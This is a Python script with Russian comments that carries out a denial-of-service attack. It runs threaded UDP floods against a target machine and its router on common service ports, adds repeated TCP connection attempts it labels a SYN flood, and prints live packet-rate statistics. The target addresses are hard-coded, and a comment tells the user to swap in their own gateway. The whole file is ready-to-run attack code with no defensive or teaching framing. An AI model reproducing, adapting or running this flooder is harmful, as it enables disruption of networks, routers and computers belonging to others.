import socket
import threading
import random
import time

class OptimizedUDPFlood:
    def __init__(self, target_ip, gateway_ip):
        self.target = target_ip
        self.gateway = gateway_ip
        self.running = True
        self.stats = {'packets': 0, 'errors': 0}
        
    def smart_udp_flood(self):
        """Умный UDP флуд с обработкой ошибок"""
        while self.running:
            try:
                # СОЗДАЕМ НОВЫЙ сокет при каждой ошибке
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 8192)  # Меньший буфер
                sock.settimeout(0.1)  # Таймаут для избежания блокировки
                
                data = b'X' * 1024  # УМЕНЬШАЕМ размер пакета для стабильности
                ports = [53, 80, 443, 123, 161, 1900, 5353, 27015]
                
                for port in ports:
                    if not self.running:
                        break
                    try:
                        sock.sendto(data, (self.target, port))
                        self.stats['packets'] += 1
                    except:
                        self.stats['errors'] += 1
                        break  # Выходим при ошибке, создаем новый сокет
                
                sock.close()
                
            except Exception as e:
                self.stats['errors'] += 1
                time.sleep(0.01)  # Небольшая пауза при ошибках

    def gateway_attack(self):
        """Атака на шлюз с пересозданием сокетов"""
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(0.1)
                data = b'G' * 512  # Еще меньше для шлюза
                
                for port in [80, 443, 53, 7547]:
                    if not self.running:
                        break
                    try:
                        sock.sendto(data, (self.gateway, port))
                        self.stats['packets'] += 1
                    except:
                        break
                
                sock.close()
                time.sleep(0.01)  # Пауза между пакетами
                
            except:
                time.sleep(0.02)

    def tcp_syn_attack(self):
        """TCP SYN flood - очень эффективно для интернета"""
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((self.target, 80))
                # Закрываем сразу - создаем много SYN запросов
                sock.close()
                self.stats['packets'] += 1
            except:
                # Ошибки подключения - это нормально для SYN flood
                pass

    def start_attacks(self):
        """Запуск оптимизированных атак"""
        print("🔥 ОПТИМИЗИРОВАННАЯ АТАКА ЗАПУЩЕНА")
        print(f"🎯 Цель: {self.target}")
        print(f"🌐 Шлюз: {self.gateway}")
        print("⚡ Авто-восстановление при ошибках\n")
        
        # Запускаем меньше потоков, но более стабильных
        for _ in range(15):  # 15 потоков UDP
            threading.Thread(target=self.smart_udp_flood, daemon=True).start()
        
        for _ in range(10):  # 10 потоков на шлюз
            threading.Thread(target=self.gateway_attack, daemon=True).start()
            
        for _ in range(5):   # 5 потоков TCP
            threading.Thread(target=self.tcp_syn_attack, daemon=True).start()

        # Мониторинг
        start_time = time.time()
        while self.running:
            elapsed = time.time() - start_time
            pps = self.stats['packets'] / elapsed if elapsed > 0 else 0
            
            print(f"\r📊 Пакетов: {self.stats['packets']:,} | "
                  f"Ошибок: {self.stats['errors']:,} | "
                  f"Скорость: {pps:,.0f} pps | "
                  f"Время: {elapsed:.1f}с", end="", flush=True)
            
            time.sleep(1)

# 🚀 ЗАПУСК
if __name__ == "__main__":
    target = "192.168.1.48"    # Целевой компьютер
    gateway = "192.168.1.1"     # ШЛЮЗ (роутер) - ЗАМЕНИ НА СВОЙ!
    
    attack = OptimizedUDPFlood(target, gateway)
    
    try:
        attack.start_attacks()
        # Держим программу активной
        while True: 
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n\n🛑 Остановка атаки...")
        attack.running = False
        time.sleep(2)
